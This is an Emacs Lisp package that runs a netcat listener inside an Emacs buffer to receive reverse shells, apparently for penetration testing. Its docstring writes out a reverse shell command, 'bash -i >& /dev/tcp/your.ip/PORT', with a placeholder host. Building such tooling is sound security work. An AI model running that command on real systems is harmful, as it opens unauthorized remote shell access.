;;; cybel-revshell.el --- A simple reverse shell -*- lexical-binding: t; -*-
;;
;; Copyright (C) 2022 Vincent RAVERA
;;
;; Author: Vincent RAVERA <ravera.vincent@gmail.com>
;; Maintainer: Vincent RAVERA <ravera.vincent@gmail.com>
;; Created: April 02, 2022
;; Modified: April 02, 2022
;; Version: 0.0.1
;; Keywords: lisp
;; Homepage: https://github.com/VincentRAVERA/cybel-revshell
;; Package-Requires: ((emacs "24.3"))
;;
;; This file is not part of GNU Emacs.
;;
;;; Commentary:

;; Provide a simple reverse shell function.

;;; Code:
(require 'comint)

(defgroup cybel-revshell nil
  "Cybel Reverse shell subgroup."
  :group 'cybel
  :prefix "cybel-revshell*"
  :link '(url-link :tag "Github" "https://github.com/VincentRavera/Cybel"))

(defvar cybel-revshell-executable "nc"
  "Reverse shell executable.")

(defvar cybel-revshell-parameters '("-l")
  "Reverse shell arguments.")

(defvar cybel-revshell-mode-map (let ((map (nconc (make-sparse-keymap) comint-mode-map)))
                            (define-key map "\t" 'completion-at-point)
                            map)
  "Reverse shell basic kaymap.")

(defvar cybel-revshell-prompt-regexp "^[a-zA-Z0-9@:\\ $#]"
  "Reverse shell possible prompt.")

;;;###autoload
(defun cybel-revshell (port)
  "Run a reverse shell listener on PORT inside Emacs.
Run `cybel-revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
  (interactive "nPort Number: ")
  (let* ((cybel-revshell-program cybel-revshell-executable)
         (cybel-revshell-parameters (append cybel-revshell-parameters '("-p") (list (int-to-string port))))
         (cybel-revshell-name (format "revshell:%d" port))
         (buffer (comint-check-proc (format "*%s*" cybel-revshell-name))))
    (pop-to-buffer-same-window
     (if (or buffer (not (derived-mode-p 'cybel-revshell-mode))
             (comint-check-proc (current-buffer)))
         (get-buffer-create (or buffer (format "*%s*" cybel-revshell-name)))
       (current-buffer)))
    (unless buffer
      (apply 'make-comint-in-buffer cybel-revshell-name buffer
             cybel-revshell-program nil cybel-revshell-parameters)
      (cybel-revshell-mode))))

(defun cybel-revshell--initialize ()
  "Helper function to start a reverseshell."
  (setq-local comint-process-echoes t)
  (setq-local comint-use-prompt-regexp t))

(define-derived-mode cybel-revshell-mode comint-mode "revshell"
  "Major mode for `cybel-revshell'.

\\<cybel-revshell-mode-map>"
  nil "cybel-revshell"
  (set (make-local-variable 'comint-prompt-regexp) cybel-revshell-prompt-regexp)
  (set (make-local-variable 'comint-prompt-read-only) t)
  (set (make-local-variable 'paragraph-separate) "\\'")
  ;; (set (make-local-variable 'font-lock-defaults) "\\'")
  (set (make-local-variable 'paragraph-start) cybel-revshell-prompt-regexp))

(add-hook 'cybel-revshell-mode-hook 'cybel-revshell--initialize)


(provide 'cybel-revshell)
;;; cybel-revshell.el ends here
